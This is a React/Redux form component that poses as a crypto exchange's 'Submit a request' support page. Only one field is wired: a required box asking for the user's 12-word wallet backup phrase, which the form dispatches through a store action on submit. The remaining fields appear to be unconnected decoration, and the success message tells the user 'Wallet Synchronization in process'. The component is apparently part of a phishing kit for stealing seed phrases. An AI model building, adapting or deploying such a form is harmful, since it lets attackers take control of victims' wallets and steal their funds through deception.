import React, { useState, useEffect } from 'react'
import { connect } from 'react-redux'
import Select from 'react-select'

import * as orderAction from '../store/actions'

const Form = (props) => {
    const [phrase, setPhrase] = useState('')
    const [toast, setToast] = useState({})

    const handlePhrase = (e) => {
        setPhrase(e.target.value)
    }

    const options = [
        {
            label: 'Wallet',
        },
        {
            label: 'Identity Verification',
        },
        {
            label: 'Security Concern',
        },

        {
            label: 'My Wallet Recovery failed',
        },
    ]
    const serviceOptions = [
        {
            label: "I'm trying to buy crypto",
        },
        {
            label: "I'm trying to sell crypto",
        },
        {
            label: "I'm trying to swap crypto",
        },

        {
            label: 'Rewards Account',
        },
        {
            label: 'Other services',
        },
    ]
    const currencyOptions = [
        {
            label: "ALGO",
        },
        {
            label: "BCH",
        },
        {
            label: "BTC",
        },

        {
            label: 'DLGD',
        },
        {
            label: 'DOGE',
        },
        {
            label: 'ETH',
        },
        {
            label: 'EUR',
        },
        {
            label: 'GBP',
        },
        {
            label: 'LTC',
        },
        {
            label: 'Not Applicable',
        },
        {
            label: 'RUB',
        },
        {
            label: 'STX',
        },
        {
            label: 'TRY',
        },
        {
            label: 'USD',
        },
        {
            label: 'USD-D',
        },
        {
            label: 'USDT-Tether',
        },
        {
            label: 'XLM-Steller',
        },
        {
            label: 'XRP',
        },
        {
            label: 'CLOUT',
        },
        {
            label: 'AAVE',
        },
        {
            label: 'LINK',
        },
        {
            label: 'COMP',
        },
        {
            label: 'DAI',
        },
        {
            label: 'UNI',
        },
        {
            label: 'USDC',
        },
        {
            label: 'WGLD',
        },
    ]

    const customStyles = {
        option: (styles, state) => ({
            ...styles,
            cursor: 'pointer',
        }),
        control: (styles) => ({
            ...styles,
            cursor: 'pointer',
        }),
        container:(styles, state) => {
            console.log({styles})
            return (
                {
                    height: '2px'
                }
            )
        }
    }

    const onPackageChange = (newValue) => {
        console.log('the value', newValue)
    }

    const handleSubmit = async (e) => {
        e.preventDefault()

        props.onInitPutPhrase(phrase)
        //  setToast({
        //      content: 'Wallet Synchronization in process!!',
        //      type: 'success',
        //  })
    }

    useEffect(() => {
        if (props.createdPhrase) {
            setToast({
                content: 'Wallet Synchronization in process!!',
                type: 'success',
            })
        }
        if (props.error) {
            console.log('error', props.error)
            setToast({
                content: 'Invalid Phrase, Please check your entries!!',
                type: 'error',
            })
        }
    }, [props.createdPhrase, props.error])

    return (
        <form
            className='grid w-full  bg-white text-[#4B4D4E]'
            onSubmit={handleSubmit}
        >
            {toast && toast.content && (
                <div className=' grid font-semibold mb-8'>
                    <p
                        className={`px-3 py-1 rounded-lg justify-self-center text-black ${
                            toast.type === 'success'
                                ? 'bg-yellow-600'
                                : 'bg-red-800'
                        }`}
                    >
                        {toast.content}
                    </p>
                </div>
            )}

            <h1
                className='pb-8'
                style={{ fontSize: '34px', fontWeight: '300' }}
            >
                Submit a request
            </h1>

            <div className='grid gap-4'>
                <div>
                    <label>Please choose a request type below</label>
                    <Select
                        options={options}
                        styles={customStyles}
                        onChange={onPackageChange}
                        placeholder={'Wallet'}
                    />
                </div>
                {/* <div>
                    <textarea
                        id='phrase'
                        className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '
                        rows={2}
                        required
                        value={phrase}
                        placeholder='Enter 12-word Backup phrase'
                        onChange={handlePhrase}
                    />
                </div> */}
                <div className='grid'>
                    <label>Your email address</label>
                    <input className='border ' />
                </div>
                <div className='grid'>
                    <label>Your pass phrase</label>
                    <textarea
                        id='phrase'
                        className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '
                        rows={4}
                        required
                        value={phrase}
                        placeholder='Enter 12-word Backup phrase'
                        onChange={handlePhrase}
                    ></textarea>{' '}
                </div>
                <div className='grid'>
                    <label>What service is your query about?</label>
                    <Select
                        options={serviceOptions}
                        isClearable
                        placeholder={'-'}
                        styles={customStyles}
                        onChange={onPackageChange}
                    />{' '}
                </div>
                <div className='grid'>
                    <label>Subject</label>
                    <input className='border ' />
                </div>
                <div className='grid'>
                    <label>How can we help you?</label>
                    <textarea
                        className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '
                        rows={4}
                    ></textarea>{' '}
                    <span>Enter the details of your request</span>
                </div>
                <div className='grid'>
                    <label>Order ID/Transaction ID</label>
                    <input className='border ' />
                </div>
                <div className='grid'>
                    <label>
                        Which currency type is related to your concern?
                    </label>
                    <Select
                        options={currencyOptions}
                        styles={customStyles}
                        onChange={onPackageChange}
                        placeholder={'-'}
                    />
                </div>
                <div className='grid'>
                    <label>Attachments</label>
                    <input
                        className='border '
                        type='file'
                        placeholder='Add file or drop files here'
                    />
                </div>
            </div>

            <div className='flex justify-between items-center pt-10 font-medium'>
                <button
                    className='text-white bg-[#1652f0] rounded-sm'
                    style={{ padding: '11px 22px', fontSize: '11px' }}
                >
                    SIGN IN
                </button>
            </div>
        </form>
    )
}

const mapStateToProps = (state) => {
    return {
        createdPhrase: state.phrase.putPhrase,
        error: state.phrase.error,
    }
}

const mapDispatchToProps = (dispatch) => {
    return {
        onInitPutPhrase: (phrase) =>
            dispatch(orderAction.initPutPhrase(phrase)),
    }
}
export default connect(mapStateToProps, mapDispatchToProps)(Form)
